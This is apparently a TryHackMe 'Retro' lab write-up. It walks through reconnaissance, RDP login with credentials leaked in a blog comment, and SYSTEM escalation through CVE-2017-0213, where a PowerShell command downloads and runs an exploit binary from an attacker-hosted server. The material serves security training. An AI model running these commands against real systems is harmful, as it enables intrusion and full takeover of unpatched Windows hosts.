# THM — Retro

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **OS:** Windows  
> **Tags:** `#thm` `#windows` `#rdp` `#osint` `#credential-reuse` `#cve-2017-0213` `#privesc` `#com-hijacking`

---

## Kill Chain Summary

```
Nmap Scan → Gobuster → /retro Blog Discovery → Passive OSINT (Wade's comment)
→ RDP Login (wade:parzival) → systeminfo → CVE-2017-0213 → NT AUTHORITY\SYSTEM
```

---

## 1. Reconnaissance — Nmap Scan

**Command:**

```bash
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

**Key results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 80/tcp | open | HTTP | Microsoft IIS 10.0 |
| 3389/tcp | open | RDP | Microsoft Terminal Services |

Two ports of interest: a web server on 80 and RDP on 3389. RDP being open immediately suggests the possibility of direct desktop access if valid credentials can be obtained.

---

## 2. Web Enumeration — Gobuster

**Command:**

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Notable finding:** `/retro`

Browsing to `http://<TARGET_IP>/retro` reveals a video-game themed blog. The author is **Wade**.

---

## 3. Passive OSINT — Credential Discovery
![retro](https://github.com/user-attachments/assets/e9b7ced7-1870-42cd-9695-15482ef6ac97)

Manually reading through the blog posts, the entry **"Ready Player One"** contains a comment left by Wade that exposes what appears to be a password in plain text:

```
wade : parzival
```

This is a classic **passive OSINT** finding — no exploitation required, credentials were leaked through normal user behaviour on a public-facing platform.

> ⚠️ **Finding:** Sensitive information (potential credentials) exposed in a blog comment. This is a social engineering / OPSEC failure — users often reuse passwords across services, and any credential found during enumeration must be tested against every available service.

---

## 4. Initial Access — RDP Login

Testing the credentials against the open RDP service:

```bash
xfreerdp /v:<TARGET_IP> /u:wade /p:parzival
```

✅ RDP session established as user `wade`.

On the Desktop: `user.txt` and a file named `hhupd` are immediately visible.

**User Flag:**

```
C:\Users\wade\Desktop\user.txt
```

---

## 5. Post-Compromise Enumeration — systeminfo

The first step after gaining access to a Windows machine is identifying the OS version and build to map known privilege escalation vulnerabilities.

**Command (Windows CMD):**

```cmd
systeminfo
```

**Output (relevant fields):**

| Field | Value |
|-------|-------|
| OS | Windows Server 2016 Standard |
| Build | 10.0.14393 |
| Architecture | x64 |
| RAM | 2048 MB |
| Hostname | RETROWEB |

> ⚠️ **Critical Finding:** Build **10.0.14393** (Windows Server 2016 RTM) is vulnerable to **CVE-2017-0213** — a privilege escalation vulnerability via COM object hijacking that allows a low-privilege user to obtain `NT AUTHORITY\SYSTEM` without any additional prerequisites.

---

## 6. Privilege Escalation — CVE-2017-0213 (COM Object Hijacking)

**CVE-2017-0213** exploits a flaw in Windows COM Aggregate Marshaler that allows an attacker to execute arbitrary code in the context of a privileged process. On unpatched builds of Windows Server 2016 (≤14393), a pre-compiled exploit binary produces a SYSTEM shell directly.

**Step 1 — Prepare and serve the exploit (Kali)**

```bash
# Extract the exploit binary
unzip CVE-2017-0213_x64.zip

# Serve it over HTTP
python3 -m http.server 80
```

**Step 2 — Download and execute on the target (Windows — browser or PowerShell)**

Navigate to the following URL from the victim machine's browser, or use PowerShell:

```
http://<KALI_IP>/CVE-2017-0213_x64.exe
```

```powershell
# Alternative — PowerShell download
iwr -uri http://<KALI_IP>/CVE-2017-0213_x64.exe -OutFile C:\Users\wade\Desktop\exploit.exe
.\exploit.exe
```

Running the exploit spawns a new shell with elevated privileges.

**Step 3 — Verify**

```cmd
whoami
# nt authority\system
```

✅ Full system compromise achieved.

---

## 7. Root Flag

```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## 8. Vulnerability Summary

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | Credentials exposed in blog comment | 🔴 High | Username and password visible in plain text in a public post |
| 2 | Credential reuse across services | 🔴 High | Blog credentials valid for RDP — same password, different service |
| 3 | RDP exposed to network | 🟡 Medium | Port 3389 reachable without network-level restrictions |
| 4 | Unpatched Windows Server 2016 (Build 14393) | 🔴 Critical | CVE-2017-0213: COM object hijacking leads to SYSTEM privesc |

---

## 9. Key Takeaways

- **Read everything during enumeration:** Credentials were not hidden behind a vulnerability — they were sitting in a blog comment. Manual content review is as important as automated scanning.
- **Credential reuse is ubiquitous:** Any credential found during reconnaissance must be tested against every exposed service. Here, the blog password worked directly on RDP — a trivial but devastating reuse.
- **`systeminfo` first, always:** The first command after gaining access to a Windows machine should be `systeminfo`. OS version and build number directly map to a known CVE catalogue for privilege escalation.
- **Python HTTP server = instant file transfer:** Hosting files with `python3 -m http.server 80` is the fastest way to move exploit binaries from Kali to a Windows target without needing SMB shares, FTP, or Meterpreter.
- **CVE-2017-0213 context:** This vulnerability affects Windows 7 through Server 2016 builds prior to the May 2017 patches. It requires no special privileges and produces a SYSTEM shell reliably on vulnerable builds — making patch management critical.

---

## Quick Reference — Key Commands

```bash
# Recon
nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>

# Web enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# RDP access
xfreerdp /v:<TARGET_IP> /u:wade /p:parzival

# Post-compromise (Windows CMD)
systeminfo

# Exploit delivery (Kali)
unzip CVE-2017-0213_x64.zip
python3 -m http.server 80

# Download on target (PowerShell)
iwr -uri http://<KALI_IP>/CVE-2017-0213_x64.exe -OutFile exploit.exe
.\exploit.exe

# Verify and loot
whoami
type C:\Users\Administrator\Desktop\root.txt
```

---

*Writeup completed on 30/03/2026 — TryHackMe / Retro*
